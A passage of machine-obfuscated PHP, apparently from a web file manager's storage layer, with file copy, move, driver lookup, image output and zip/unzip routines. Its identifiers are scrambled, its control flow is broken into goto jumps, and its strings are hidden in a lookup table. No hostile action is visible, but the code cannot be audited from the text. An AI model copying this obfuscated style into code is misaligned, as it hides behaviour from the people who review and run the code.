($bÌÀæ«•ò«) { if ($cƒ¼ù‡‘æù == $f¹¢ÚÓÅ™[492] && !method_exists($BÌØè¼¸ªÁ, $f¹¢ÚÓÅ™[1003]) && trim($DÕ»áîîÈº, $f¹¢ÚÓÅ™[8]) == trim($BÌØè¼¸ªÁ->pathFather($F°ø«‘), $f¹¢ÚÓÅ™[8])) { return $BÌØè¼¸ªÁ->getPathOuter($F°ø«‘); } if (method_exists($BÌØè¼¸ªÁ, $cƒ¼ù‡‘æù)) { return $BÌØè¼¸ªÁ->{$cƒ¼ù‡‘æù}($F°ø«‘, $DÕ»áîîÈº, $f¢ö¤ïÎ¾±); } } goto eòµƒ«ƒó; cêŸİ°î†œ: $B¢ñß¸ïÓ = !1; if ($BÌØè¼¸ªÁ->pathParse[$f¹¢ÚÓÅ™[1002]]) { $DÕ»áîîÈº = $BÌØè¼¸ªÁ->pathParse[$f¹¢ÚÓÅ™[1002]]; $B¢ñß¸ïÓ = $BÌØè¼¸ªÁ; $BÌØè¼¸ªÁ = self::driverMake($DÕ»áîîÈº); } self::check($C±’˜’œ’Œ, $F°ø«‘, $BÌØè¼¸ªÁ, $DÕ»áîîÈº); goto Eğ¾µÊÖôà; EäçŠ§Ò­: } private static function check($b‰‘•á¹, $B»àÓìÈ·”, $BÍ¾îÈô , &$B±ø¡Û‚Ú¿) { $FğÒ±ˆì© =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (self::driverIsSame($b‰‘•á¹, $BÍ¾îÈô ) && $b‰‘•á¹->isFolder($B»àÓìÈ·”) && $b‰‘•á¹->isParentOf($B»àÓìÈ·”, $B±ø¡Û‚Ú¿)) { show_json(LNG($FğÒ±ˆì©[1004]), !1); } if (!$b‰‘•á¹->exist($B»àÓìÈ·”)) { show_json(LNG($FğÒ±ˆì©[101]), !1); } } private static function copyPath($dó Ÿôºë, $cÙÓîà¬±Ì, $C©ˆàë÷ğ, $Cõì¢Ãæ¥, $A÷ª…ß, $D®çÆéòÛò, $dÀÎâˆ¿, $FÖÅ›ÄÑ = false) { goto dÚå­£°Ã‘; AŸƒÏ‡Ú’›: $e¡ÙßêÙ‰ = array_merge($f’¦áÚ¦ß•[$aø¾ÆÉ©«İ[73]], $f’¦áÚ¦ß•[$aø¾ÆÉ©«İ[74]]); foreach ($e¡ÙßêÙ‰ as $F­äÔå¸Á) { $fëÔ²ÑÀÆº = $F­äÔå¸Á[$aø¾ÆÉ©«İ[29]] == $aø¾ÆÉ©«İ[167]; $cÙÓîà¬±Ì = $dó Ÿôºë->getPathInner($F­äÔå¸Á[$aø¾ÆÉ©«İ[75]]); $E¦’˜Ë•­Â = self::copyPath($dó Ÿôºë, $cÙÓîà¬±Ì, $C©ˆàë÷ğ, $Cõì¢Ãæ¥, $A÷ª…ß, $D®çÆéòÛò, $fëÔ²ÑÀÆº); if (!$E¦’˜Ë•­Â) { write_log($aø¾ÆÉ©«İ[1005] . $cÙÓîà¬±Ì . $aø¾ÆÉ©«İ[1006] . $Cõì¢Ãæ¥, $aø¾ÆÉ©«İ[1007]); } } return $DÉ¿¢›Ş÷Î; goto C¨æ¥£»‹›; dÚå­£°Ã‘: $aø¾ÆÉ©«İ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C±‘ÊŠ®¿ = $FÖÅ›ÄÑ ? $FÖÅ›ÄÑ : $dó Ÿôºë->getPathName($dó Ÿôºë->pathThis($cÙÓîà¬±Ì)); if ($A÷ª…ß) { $B¬ƒÇğŸ‡„ = $C©ˆàë÷ğ->fileNameExist($Cõì¢Ãæ¥, $C±‘ÊŠ®¿); $C±‘ÊŠ®¿ = $C©ˆàë÷ğ->fileNameAuto($Cõì¢Ãæ¥, $C±‘ÊŠ®¿, $A÷ª…ß, !$dÀÎâˆ¿); $A÷ª…ß = $B¬ƒÇğŸ‡„ ? $A÷ª…ß : !1; } goto e°ó‰Æ ùº; e°ó‰Æ ùº: if ($dÀÎâˆ¿) { return self::copyFile($dó Ÿôºë, $cÙÓîà¬±Ì, $C©ˆàë÷ğ, $Cõì¢Ãæ¥, $C±‘ÊŠ®¿, $D®çÆéòÛò); } if ($A÷ª…ß == REPEAT_RENAME_FOLDER) { $A÷ª…ß = !1; } $bØó‹ã¥àŞ = rtrim($Cõì¢Ãæ¥, $aø¾ÆÉ©«İ[8]) . $aø¾ÆÉ©«İ[8] . $C±‘ÊŠ®¿; goto Eáù•’Í‘; Eáù•’Í‘: $DÉ¿¢›Ş÷Î = $C©ˆàë÷ğ->mkdir($C©ˆàë÷ğ->getPath($bØó‹ã¥àŞ)); $Cõì¢Ãæ¥ = $C©ˆàë÷ğ->getPathInner($DÉ¿¢›Ş÷Î); $f’¦áÚ¦ß• = $dó Ÿôºë->listPath($cÙÓîà¬±Ì, !0); goto AŸƒÏ‡Ú’›; C¨æ¥£»‹›: } private static function copyFile($Eò£­‰Âˆ§, $FÌááÇ”, $Dùæ‹İ©¶¢, $E±±ºåç‰, $c·õƒ–ùÎ, $däñàÁñ) { goto Aßë§É­ğ; Aßë§É­ğ: $fôŒé·êŠÂ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E±±ºåç‰ = $Dùæ‹İ©¶¢->getPath(rtrim($E±±ºåç‰, $fôŒé·êŠÂ[8]) . $fôŒé·êŠÂ[8] . $c·õƒ–ùÎ); $DŠÑ°™ŠÏ¶ = $fôŒé·êŠÂ[1008] . time() . rand_string(5); goto c›¸è½‡¢; c›¸è½‡¢: Hook::trigger($fôŒé·êŠÂ[1009], $Eò£­‰Âˆ§, $FÌááÇ”, $Dùæ‹İ©¶¢, $E±±ºåç‰, $c·õƒ–ùÎ, $DŠÑ°™ŠÏ¶); if (self::driverIsSame($Eò£­‰Âˆ§, $Dùæ‹İ©¶¢)) { if ($däñàÁñ) { $AˆœÏß”ô = $Dùæ‹İ©¶¢->moveFile($FÌááÇ”, $E±±ºåç‰); } else { $AˆœÏß”ô = $Dùæ‹İ©¶¢->copyFile($FÌááÇ”, $E±±ºåç‰); } Hook::trigger($fôŒé·êŠÂ[1010], $Eò£­‰Âˆ§, $FÌááÇ”, $Dùæ‹İ©¶¢, $E±±ºåç‰, $c·õƒ–ùÎ, $AˆœÏß”ô); return $AˆœÏß”ô; } $EÁ§ÛÇ£ğŒ = TEMP_FILES; goto DÃª¬íÓĞŒ; CµáÆá”¿ƒ: Hook::trigger($fôŒé·êŠÂ[1010], $Eò£­‰Âˆ§, $FÌááÇ”, $Dùæ‹İ©¶¢, $E±±ºåç‰, $c·õƒ–ùÎ, $AˆœÏß”ô); return $AˆœÏß”ô; goto d¤¿ÊŠˆÅ; DÃª¬íÓĞŒ: mk_dir($EÁ§ÛÇ£ğŒ); $fŞùçŠˆ‹ƒ = $EÁ§ÛÇ£ğŒ . $DŠÑ°™ŠÏ¶; $fŞùçŠˆ‹ƒ = $Eò£­‰Âˆ§->download($FÌááÇ”, $fŞùçŠˆ‹ƒ); goto d™á÷¼Š‹; d™á÷¼Š‹: $fŞùçŠˆ‹ƒ = $Eò£­‰Âˆ§->iconvApp($fŞùçŠˆ‹ƒ); $AˆœÏß”ô = $Dùæ‹İ©¶¢->upload($E±±ºåç‰, $fŞùçŠˆ‹ƒ, $däñàÁñ); self::remove($EÁ§ÛÇ£ğŒ . $DŠÑ°™ŠÏ¶); goto CµáÆá”¿ƒ; d¤¿ÊŠˆÅ: } public static function pathFather($d‰ “ç½¢) { $B‡Ã™ÁÂ« = IO::init($d‰ “ç½¢); $Cá•Š“Ë¹ï = $B‡Ã™ÁÂ«->pathFather($B‡Ã™ÁÂ«->path); return $B‡Ã™ÁÂ«->getPathOuter($Cá•Š“Ë¹ï); } public static function fileOut($D£òë˜¾Ğ , $fó¡÷Îèœ = false, $bñ÷¯ßÎçƒ = false, $aÑ²ô”ƒØ = '') { $FŸóøéèî³ = self::driverMake($D£òë˜¾Ğ ); if ($FŸóøéèî³->isFileOutServer()) { return $FŸóøéèî³->fileOutServer($D£òë˜¾Ğ , $fó¡÷Îèœ, $bñ÷¯ßÎçƒ, $aÑ²ô”ƒØ); } return $FŸóøéèî³->fileOut($D£òë˜¾Ğ , $fó¡÷Îèœ, $bñ÷¯ßÎçƒ, $aÑ²ô”ƒØ); } public static function fileOutImage($FÃ±­ì¼Ä, $BÙŒ°–å¥§ = 250) { $CîÔ•ºÇ©« = array(250, 600, 1200, 3000); for ($Bç§¥®ù®¥ = 0; $Bç§¥®ù®¥ < count($CîÔ•ºÇ©«); $Bç§¥®ù®¥++) { if ($Bç§¥®ù®¥ == 0 && $BÙŒ°–å¥§ <= $CîÔ•ºÇ©«[$Bç§¥®ù®¥]) { $BÙŒ°–å¥§ = $CîÔ•ºÇ©«[$Bç§¥®ù®¥]; break; } else { if ($BÙŒ°–å¥§ > $CîÔ•ºÇ©«[$Bç§¥®ù®¥ - 1] && $BÙŒ°–å¥§ <= $CîÔ•ºÇ©«[$Bç§¥®ù®¥]) { $BÙŒ°–å¥§ = $CîÔ•ºÇ©«[$Bç§¥®ù®¥]; break; } else { if ($Bç§¥®ù®¥ == count($CîÔ•ºÇ©«) - 1 && $BÙŒ°–å¥§ > $CîÔ•ºÇ©«[$Bç§¥®ù®¥]) { $BÙŒ°–å¥§ = $CîÔ•ºÇ©«[$Bç§¥®ù®¥]; break; } } } } $f¸Øé®øÏÔ = self::driverMake($FÃ±­ì¼Ä); if ($f¸Øé®øÏÔ->isFileOutServer()) { return $f¸Øé®øÏÔ->fileOutImageServer($FÃ±­ì¼Ä, $BÙŒ°–å¥§); } return $f¸Øé®øÏÔ->fileOutImage($FÃ±­ì¼Ä, $BÙŒ°–å¥§); } private static function driverIsSame($E×¸Ìä×¤, $cÍ‘ˆè¶µâ) { goto d‚ŞÑÉê”; CĞ®†æĞ†ƒ: if ($E×¸Ìä×¤->pathDriver == $cÍ‘ˆè¶µâ->pathDriver) { return !0; } return !1; goto f©¹–ï­Ô‰; d‚ŞÑÉê”: $dæŒØ×°êã =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D‘ö•à†ºÈ = $E×¸Ìä×¤->getType(); $aÆßçŸŠ = $cÍ‘ˆè¶µâ->getType(); goto f’»Ä…èÀ; f’»Ä…èÀ: if ($D‘ö•à†ºÈ != $aÆßçŸŠ) { return !1; } if ($D‘ö•à†ºÈ == $dæŒØ×°êã[697]) { return !0; } if ($D‘ö•à†ºÈ == $dæŒØ×°êã[102]) { return !0; } goto CĞ®†æĞ†ƒ; f©¹–ï­Ô‰: } public static function copyUpdate($F—¾´Ë‘£õ, $eªÄ×åù¯œ) { goto eÄà»™ï‡–; aŸÁ®øğ„¤: Hook::trigger($e–Ë¿Š†œ•[1014], $F—¾´Ë‘£õ, $eªÄ×åù¯œ, $F¬³ÉÒ±Í); foreach ($cÊˆ‰å†´è as $D½±°ŒœØØ) { IO::mkdir($D½±°ŒœØØ); } foreach ($EˆæÏš¸–„ as $D½±°ŒœØØ) { IO::copy($D½±°ŒœØØ[$e–Ë¿Š†œ•[1011]], $D½±°ŒœØØ[$e–Ë¿Š†œ•[1012]], REPEAT_REPLACE); } goto D¥õ–ÂÜ¬È; BÉŞ…è£äì: $FˆîÈÏæâ¢ = self::_listAll($F—¾´Ë‘£õ); $BÍÉÜŠÜÔ§ = self::_listAll($eªÄ×åù¯œ); $EˆæÏš¸–„ = array(); goto a©‡»â’ù; eÄà»™ï‡–: $e–Ë¿Š†œ• =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!IO::exist($F—¾´Ë‘£õ)) { return !1; } if (!IO::exist($eªÄ×åù¯œ)) { IO::mkdir($eªÄ×åù¯œ); } goto BÉŞ…è£äì; a©‡»â’ù: $cÊˆ‰å†´è = array(); foreach ($FˆîÈÏæâ¢ as $C„ÄÕ‰ê× => $D½±°ŒœØØ) { if (isset($BÍÉÜŠÜÔ§[$C„ÄÕ‰ê×])) { if ($D½±°ŒœØØ[$e–Ë¿Š†œ•[76]] == 1) { continue; } if ($BÍÉÜŠÜÔ§[$C„ÄÕ‰ê×][$e–Ë¿Š†œ•[77]] == $D½±°ŒœØØ[$e–Ë¿Š†œ•[77]]) { continue; } } if ($D½±°ŒœØØ[$e–Ë¿Š†œ•[76]] == 1) { $cÊˆ‰å†´è[] = $eªÄ×åù¯œ . $e–Ë¿Š†œ•[8] . $C„ÄÕ‰ê×; continue; } $AñìÒ¿ù¨ = strstr(trim($C„ÄÕ‰ê×, $e–Ë¿Š†œ•[8]), $e–Ë¿Š†œ•[8]) ? get_path_father($C„ÄÕ‰ê×) : $e–Ë¿Š†œ•[33]; $EˆæÏš¸–„[] = array($e–Ë¿Š†œ•[1011] => $D½±°ŒœØØ[$e–Ë¿Š†œ•[75]], $e–Ë¿Š†œ•[1012] => rtrim($eªÄ×åù¯œ, $e–Ë¿Š†œ•[8]) . $e–Ë¿Š†œ•[8] . $AñìÒ¿ù¨, $e–Ë¿Š†œ•[1013] => $D½±°ŒœØØ); } $F¬³ÉÒ±Í = array($e–Ë¿Š†œ•[167] => $EˆæÏš¸–„, $e–Ë¿Š†œ•[76] => $cÊˆ‰å†´è); goto aŸÁ®øğ„¤; D¥õ–ÂÜ¬È: } private static function _listAll($f‹µéÂ¶Ø) { $BÖ¾óÙ˜Ñ¸ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f‹µéÂ¶Ø = KodIO::clear($f‹µéÂ¶Ø); $CÎÚì´°À” = IO::listAll($f‹µéÂ¶Ø); foreach ($CÎÚì´°À” as &$FÔ‘ÛÂŠ «) { $EîÕ¿˜»˜ = substr($FÔ‘ÛÂŠ «[$BÖ¾óÙ˜Ñ¸[75]], strlen($f‹µéÂ¶Ø)); $FÔ‘ÛÂŠ «[$BÖ¾óÙ˜Ñ¸[1015]] = trim($EîÕ¿˜»˜, $BÖ¾óÙ˜Ñ¸[8]); } return array_to_keyvalue($CÎÚì´°À”, $BÖ¾óÙ˜Ñ¸[1015]); } public static function fileSubstr($Aµ£µ¸óïª, $DÓ…ÕÁ„ğÖ, $E¬ÚÃÀ»… = false) { goto cñ‹ÒÌºà‘; cÀÆ³ÄïºÍ: if ($DÓ…ÕÁ„ğÖ + $E¬ÚÃÀ»… > $fÒõ°‘”Ë) { $E¬ÚÃÀ»… = $fÒõ°‘”Ë - $DÓ…ÕÁ„ğÖ; } if ($E¬ÚÃÀ»… <= 0) { return $_SERVER[³‘’¼äÑ™ÔÍ][33]; } if ($DÓ…ÕÁ„ğÖ < 0 || $DÓ…ÕÁ„ğÖ >= $fÒõ°‘”Ë || $E¬ÚÃÀ»… > 1024 * 1024 * 5) { throw new Exception("\146\x69\154\145\122\x65\x61\x64\40\145\162\x72\x6f\x72\x21\40\x73\x74\141\x72\x74\75{$DÓ…ÕÁ„ğÖ}\x3b\154\145\x6e\147\164\x68\x3d{$E¬ÚÃÀ»…}\x3b\x20\x73\x69\x7a\145\75{$fÒõ°‘”Ë}\x3b"); } goto a¡ëÙ­Ç‡ó; a¡ëÙ­Ç‡ó: return $eÕïàÊÖ²»->fileSubstr($Aµ£µ¸óïª, $DÓ…ÕÁ„ğÖ, $E¬ÚÃÀ»…); goto dî¢„…«È; bî¡ã‡©æˆ: $AƒÊğ¸·¡ë = $E¬ÚÃÀ»…; if ($DÓ…ÕÁ„ğÖ < 0) { $DÓ…ÕÁ„ğÖ = $fÒõ°‘”Ë + $DÓ…ÕÁ„ğÖ; } if ($E¬ÚÃÀ»… === !1) { $E¬ÚÃÀ»… = $fÒõ°‘”Ë - $DÓ…ÕÁ„ğÖ; } goto cÀÆ³ÄïºÍ; cñ‹ÒÌºà‘: $eÕïàÊÖ²» = self::driverMake($Aµ£µ¸óïª); $fÒõ°‘”Ë = $eÕïàÊÖ²»->size($Aµ£µ¸óïª); $E ŞÀ™ŸØ– = $DÓ…ÕÁ„ğÖ; goto bî¡ã‡©æˆ; dî¢„…«È: } private static function driverMake(&$bµËç†šÜÓ) { goto fÏùŸ®¤´; FõÜƒ³íÓÊ: return $a…Ì¹©è¬; goto AŞïî¦¾¤‰; fÏùŸ®¤´: $E÷£ì—ÏÃ· =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eç”­òÛï‡ = KodIO::parse($bµËç†šÜÓ); if (!self::$driverListSystem) { $f«Øİíšå = Model($E÷£ì—ÏÃ·[707])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($f«Øİíšå, $E÷£ì—ÏÃ·[367]); } goto fé¬ğ‰«ö«; fé¬ğ‰«ö«: if ($eç”­òÛï‡[$E÷£ì—ÏÃ·[29]] == KodIO::KOD_IO && !self::$driverListSystem[$eç”­òÛï‡[$E÷£ì—ÏÃ·[367]]]) { return !1; } $bµËç†šÜÓ = $eç”­òÛï‡[$E÷£ì—ÏÃ·[1016]]; $a…Ì¹©è¬ = self::driverGet($eç”­òÛï‡, $bµËç†šÜÓ); goto FõÜƒ³íÓÊ; AŞïî¦¾¤‰: } private static function driverGet($dí…Ûè¨œ‹, &$eô²£¬õî) { goto f¿æè´¸; f¿æè´¸: $Cª ³÷¨–« =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fôâ£‡õ© = $dí…Ûè¨œ‹[$Cª ³÷¨–«[1017]]; $a²ß•¬‘ó  = $dí…Ûè¨œ‹[$Cª ³÷¨–«[367]]; goto bÓ‰ñ„ÍîÜ; d¢éò•äã: $D¤ÖÓ×Üİ™ = self::$driverCache[$aÛÕÉ‘Ô¡‹]; $D¤ÖÓ×Üİ™->pathDriver = $fôâ£‡õ©; $D¤ÖÓ×Üİ™->pathBase = $Cª ³÷¨–«[33]; goto DÜ«Ğ¥¯¹Ş; bÓ‰ñ„ÍîÜ: switch ($dí…Ûè¨œ‹[$Cª ³÷¨–«[29]]) { case KodIO::KOD_IO: $a¯ËÊ‰›í¼ = self::$driverListSystem[$a²ß•¬‘ó ]; break; case KodIO::KOD_SOURCE: $eô²£¬õî = $a²ß•¬‘ó  . $eô²£¬õî; $a¯ËÊ‰›í¼ = array($Cª ³÷¨–«[1018] => $Cª ³÷¨–«[1019], $Cª ³÷¨–«[6] => $dí…Ûè¨œ‹); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $aİ¾ÓîÃğÇ = $GLOBALS[$Cª ³÷¨–«[1020]]; self::$driverListUser = array_to_keyvalue($aİ¾ÓîÃğÇ, $Cª ³÷¨–«[367]); } $a¯ËÊ‰›í¼ = self::$driverListUser[$a²ß•¬‘ó ]; break; case KodIO::KOD_SHARE_LINK: $a¯ËÊ‰›í¼ = array($Cª ³÷¨–«[1018] => $Cª ³÷¨–«[1021], $Cª ³÷¨–«[6] => $dí…Ûè¨œ‹); $aÌ‰ö‚Íö = Action($Cª ³÷¨–«[1022])->sharePathInfo($dí…Ûè¨œ‹[$Cª ³÷¨–«[75]]); $eô²£¬õî = $aÌ‰ö‚Íö[$Cª ³÷¨–«[369]]; if (!$aÌ‰ö‚Íö[$Cª ³÷¨–«[369]]) { $d¤µñ·‡®Ï = Model($Cª ³÷¨–«[536])->getInfo($aÌ‰ö‚Íö[$Cª ³÷¨–«[441]]); $eô²£¬õî = KodIO::clear($d¤µñ·‡®Ï[$Cª ³÷¨–«[1023]] . $dí…Ûè¨œ‹[$Cª ³÷¨–«[1016]]); $dí…Ûè¨œ‹[$Cª ³÷¨–«[439]] = $d¤µñ·‡®Ï; $dí…Ûè¨œ‹[$Cª ³÷¨–«[1002]] = $eô²£¬õî; $a¯ËÊ‰›í¼ = array($Cª ³÷¨–«[1018] => $Cª ³÷¨–«[1024], $Cª ³÷¨–«[6] => $dí…Ûè¨œ‹); } break; case KodIO::KOD_SHARE_ITEM: $a¯ËÊ‰›í¼ = array($Cª ³÷¨–«[1018] => $Cª ³÷¨–«[1025], $Cª ³÷¨–«[6] => $dí…Ûè¨œ‹); $d¤µñ·‡®Ï = Model($Cª ³÷¨–«[536])->getInfo($dí…Ûè¨œ‹[$Cª ³÷¨–«[367]]); if ($d¤µñ·‡®Ï[$Cª ³÷¨–«[369]] == $Cª ³÷¨–«[468]) { $eô²£¬õî = KodIO::clear($d¤µñ·‡®Ï[$Cª ³÷¨–«[1023]] . $dí…Ûè¨œ‹[$Cª ³÷¨–«[1016]]); $dí…Ûè¨œ‹[$Cª ³÷¨–«[439]] = $d¤µñ·‡®Ï; $dí…Ûè¨œ‹[$Cª ³÷¨–«[1002]] = $eô²£¬õî; $a¯ËÊ‰›í¼ = array($Cª ³÷¨–«[1018] => $Cª ³÷¨–«[1026], $Cª ³÷¨–«[6] => $dí…Ûè¨œ‹); } else { if (!$eô²£¬õî) { $eô²£¬õî = $d¤µñ·‡®Ï[$Cª ³÷¨–«[369]]; } } break; default: $eô²£¬õî = $dí…Ûè¨œ‹[$Cª ³÷¨–«[75]]; $a¯ËÊ‰›í¼ = array($Cª ³÷¨–«[1018] => $Cª ³÷¨–«[1027]); break; } $aÛÕÉ‘Ô¡‹ = $dí…Ûè¨œ‹[$Cª ³÷¨–«[75]]; if (!isset(self::$driverCache[$aÛÕÉ‘Ô¡‹])) { $Aïôë¼ŞÚÀ = strtolower($a¯ËÊ‰›í¼[$Cª ³÷¨–«[90]]); $b²¸¢ê·É‹ = $GLOBALS[$Cª ³÷¨–«[6]][$Cª ³÷¨–«[84]][$Cª ³÷¨–«[757]]; $EÆÏèØñÜ = $Cª ³÷¨–«[71] . (isset($b²¸¢ê·É‹[$Aïôë¼ŞÚÀ]) ? $b²¸¢ê·É‹[$Aïôë¼ŞÚÀ] : ucfirst($Aïôë¼ŞÚÀ)); if (!class_exists($EÆÏèØñÜ)) { show_json("{$EÆÏèØñÜ}\40\x6e\x6f\x74\x20\x65\x78\x69\x73\x74\x73\41", !1); } $dËŸ®İ¤·å = isset($a¯ËÊ‰›í¼[$Cª ³÷¨–«[6]]) ? $a¯ËÊ‰›í¼[$Cª ³÷¨–«[6]] : !1; self::$driverCache[$aÛÕÉ‘Ô¡‹] = new $EÆÏèØñÜ($dËŸ®İ¤·å); } goto d¢éò•äã; DÜ«Ğ¥¯¹Ş: if (isset($a¯ËÊ‰›í¼[$Cª ³÷¨–«[6]][$Cª ³÷¨–«[1028]])) { $D¤ÖÓ×Üİ™->pathBase = rtrim($a¯ËÊ‰›í¼[$Cª ³÷¨–«[6]][$Cª ³÷¨–«[1028]], $Cª ³÷¨–«[8]) . $Cª ³÷¨–«[8]; $eô²£¬õî = $D¤ÖÓ×Üİ™->pathBase . ltrim($eô²£¬õî, $Cª ³÷¨–«[8]); } $eô²£¬õî = $D¤ÖÓ×Üİ™->getPath($eô²£¬õî); if (isset($dí…Ûè¨œ‹[$Cª ³÷¨–«[1002]])) { $eô²£¬õî = $dí…Ûè¨œ‹[$Cª ³÷¨–«[1002]]; } goto FÒµ©Ş—È; FÒµ©Ş—È: $D¤ÖÓ×Üİ™->path = $eô²£¬õî; return $D¤ÖÓ×Üİ™; goto fââ¿ÌÑº; fââ¿ÌÑº: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $B‡Ó‡¶¾; if (!$B‡Ó‡¶¾) { $d³­©ìõë† = IO::init($_SERVER[³‘’¼äÑ™ÔÍ][8]); } return $d³­©ìõë†; } private static function iconvSystem($E÷”¢ï‘Â©) { return self::local()->iconvSystem($E÷”¢ï‘Â©); } private static function iconvApp($E¡÷áÖÎ”) { return self::local()->iconvApp($E¡÷áÖÎ”); } public static function zip($aí°ùÙØà¯, $f™šÃğ¸‚³ = "\172\x69\x70", $E××µ¹í©„ = '', $aĞÔÍŠÁ¯Å = REPEAT_RENAME) { goto b„Í¬—òÄ‹; FÅùÛ‹‘¾Ñ: $B½§ÖÈ»Õ´ = !1; if (!$E××µ¹í©„ && $d§à…øï‰‘->getType() == $aéğ÷ÚƒñÙ[102]) { $BñÊ¹Ø¡¨ = self::zipFileList($aí°ùÙØà¯); } else { $B½§ÖÈ»Õ´ = $E××µ¹í©„ ? $E××µ¹í©„ : TEMP_FILES . $aéğ÷ÚƒñÙ[1029] . time() . rand_string(8) . $aéğ÷ÚƒñÙ[8]; mk_dir($B½§ÖÈ»Õ´); $BñÊ¹Ø¡¨ = self::zipFileList($aí°ùÙØà¯, $B½§ÖÈ»Õ´); } $aØˆÒİ¤ŞÅ = $eâóùÔ¡Ÿó[$aéğ÷ÚƒñÙ[28]]; goto Eæ—ã¹×ë¹; Eæ—ã¹×ë¹: if (count($BñÊ¹Ø¡¨) > 1) { $Cš·Ò­ï¬À = IO::info(IO::pathFather($eâóùÔ¡Ÿó[$aéğ÷ÚƒñÙ[75]])); $aØˆÒİ¤ŞÅ = $Cš·Ò­ï¬À[$aéğ÷ÚƒñÙ[28]]; } $d®¯ÃÌàŠŸ = $B½§ÖÈ»Õ´; if (!$d®¯ÃÌàŠŸ) { $d®¯ÃÌàŠŸ = get_path_father($eâóùÔ¡Ÿó[$aéğ÷ÚƒñÙ[75]]); $bÉìÜÆª­ = IO::info($d®¯ÃÌàŠŸ); if (!$bÉìÜÆª­[$aéğ÷ÚƒñÙ[189]]) { show_json(LNG($aéğ÷ÚƒñÙ[1030]), !1); } } goto bÅ×À¬¸¼; aŠ±ˆ»Å: foreach ($BñÊ¹Ø¡¨ as $B™™´ãÉÉ => $FÏ²Ö‚¨È¸) { $BñÊ¹Ø¡¨[$B™™´ãÉÉ] = self::iconvSystem($FÏ²Ö‚¨È¸); } KodArchive::create($a´§³Ú¹Ÿğ, $BñÊ¹Ø¡¨); if (!IO::exist($Bù¯‡Íä„Ã)) { if ($B½§ÖÈ»Õ´) { del_dir($B½§ÖÈ»Õ´); } show_json(LNG($aéğ÷ÚƒñÙ[1031]), !1); } goto aëˆ†šÏ; aëˆ†šÏ: if ($E××µ¹í©„ || !$B½§ÖÈ»Õ´) { if ($B½§ÖÈ»Õ´ && strstr($B½§ÖÈ»Õ´, TEMP_FILES)) { $EÎ¯î¸ Õî = $BñÊ¹Ø¡¨ = array(); recursion_dir($d®¯ÃÌàŠŸ, $EÎ¯î¸ Õî, $BñÊ¹Ø¡¨, 0); foreach ($EÎ¯î¸ Õî as $AŠã¿µ£ë ) { del_dir($AŠã¿µ£ë ); } foreach ($BñÊ¹Ø¡¨ as $d„ÅŒÌ¡ê) { if ($d„ÅŒÌ¡ê == $a´§³Ú¹Ÿğ) { continue; } del_file($d„ÅŒÌ¡ê); } } return $Bù¯‡Íä„Ã; } $bµ ÷óõ¼ = self::pathFather($eâóùÔ¡Ÿó[$aéğ÷ÚƒñÙ[75]]); $D‰ˆŞ¨£öà = self::move($Bù¯‡Íä„Ã, $bµ ÷óõ¼, $aĞÔÍŠÁ¯Å); goto cŠŒ«ÖÔäñ; b„Í¬—òÄ‹: $aéğ÷ÚƒñÙ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d§à…øï‰‘ = self::init($aí°ùÙØà¯[0][$aéğ÷ÚƒñÙ[75]]); $eâóùÔ¡Ÿó = self::info($aí°ùÙØà¯[0][$aéğ÷ÚƒñÙ[75]]); goto FÅùÛ‹‘¾Ñ; bÅ×À¬¸¼: $Bù¯‡Íä„Ã = $d®¯ÃÌàŠŸ . $aØˆÒİ¤ŞÅ . $aéğ÷ÚƒñÙ[91] . $f™šÃğ¸‚³; $Bù¯‡Íä„Ã = get_filename_auto($Bù¯‡Íä„Ã, $aéğ÷ÚƒñÙ[33], $aĞÔÍŠÁ¯Å); $a´§³Ú¹Ÿğ = self::iconvSystem($Bù¯‡Íä„Ã); goto aŠ±ˆ»Å; cŠŒ«ÖÔäñ: if (!$D‰ˆŞ¨£öà) { del_dir($B½§ÖÈ»Õ´); show_json(LNG($aéğ÷ÚƒñÙ[1031]), !1); } del_dir($B½§ÖÈ»Õ´); return $D‰ˆŞ¨£öà; goto bÅ”§æ©è; bÅ”§æ©è: } public static function unzip($fîÁÆ‡Şä–, $bˆ×è„÷¦µ = "\162\x65\x70\x6c\141\x63\x65") { goto fˆñ¼£¦…; cñ‘ŠƒÍ•¤: mk_dir($EÛÍÚ´¡ùÈ); $eåÎ–ÈõËé = self::fileExt($B—¡ä˜í¸Ó); $dá§‰‹Ë§ = $EÛÍÚ´¡ùÈ . $F´¶–ÊäÍ[91] . $eåÎ–ÈõËé; goto dÌì‰îÊÁë; dÌì‰îÊÁë: if (!@file_exists(self::iconvSystem($dá§‰‹Ë§))) { $aÖ×ñÖ‡ù‹ = self::localFilePath($EŠßØğ­‡æ, $eåÎ–ÈõËé); $dá§‰‹Ë§ = $aÖ×ñÖ‡ù‹ ? $aÖ×ñÖ‡ù‹ : parent::download($EŠßØğ­‡æ, $dá§‰‹Ë§); } $dá§‰‹Ë§ = self::iconvSystem($dá§‰‹Ë§); $eÏ™›œµ‘§ = isset($fîÁÆ‡Şä–[$F´¶–ÊäÍ[1034]]) ? $fîÁÆ‡Şä–[$F´¶–ÊäÍ[1034]] : $F´¶–ÊäÍ[1035]; goto bÕÃ•‘‡‚; A×Şˆ–ğÑ: $DİÄ©¦‰‹ = self::tmpFileName($B—¡ä˜í¸Ó); $EÛÍÚ´¡ùÈ = TEMP_FILES . $DİÄ©¦‰‹; del_dir($EÛÍÚ´¡ùÈ); goto cñ‘ŠƒÍ•¤; cãˆ¸á‰: if (!($B—¡ä˜í¸Ó = parent::info($EŠßØğ­‡æ))) { show_json(LNG($F´¶–ÊäÍ[1033]), !1); } if (!($f´œñÛøêà = parent::infoFull($FŒË ®±‹â))) { $FŒË ®±‹â = parent::mkdir($FŒË ®±‹â); $f´œñÛøêà = array($F´¶–ÊäÍ[75] => $FŒË ®±‹â); } else { if (isset($f´œñÛøêà[$F´¶–ÊäÍ[369]]) && trim($f´œñÛøêà[$F´¶–ÊäÍ[75]], $F´¶–ÊäÍ[8]) != trim($FŒË ®±‹â, $F´¶–ÊäÍ[8])) { $E˜´ç” ¤É = 